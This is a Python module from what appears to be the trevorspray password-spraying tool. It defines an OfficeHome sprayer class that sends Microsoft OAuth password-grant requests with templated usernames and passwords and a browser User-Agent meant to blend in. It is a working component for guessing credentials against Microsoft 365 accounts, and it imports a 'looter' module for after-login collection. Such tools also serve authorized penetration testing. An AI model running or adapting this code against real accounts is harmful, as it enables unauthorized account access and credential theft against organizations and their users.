import uuid
import logging
from contextlib import suppress
from .msol import MSOL
from ..looters.msol import MSOLLooter

log = logging.getLogger("trevorspray.sprayers.officehome")


class OfficeHome(MSOL):
    request_data = {
        "resource": "4765445b-32c6-49b0-83e6-1d93765276ca",  # OfficeHome
        "client_id": "4765445b-32c6-49b0-83e6-1d93765276ca",  # OfficeHome
        "client_info": "1",
        "grant_type": "password",
        "scope": "openid",
        "username": "{username}",
        "password": "{password}",
    }

    headers = {
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    }
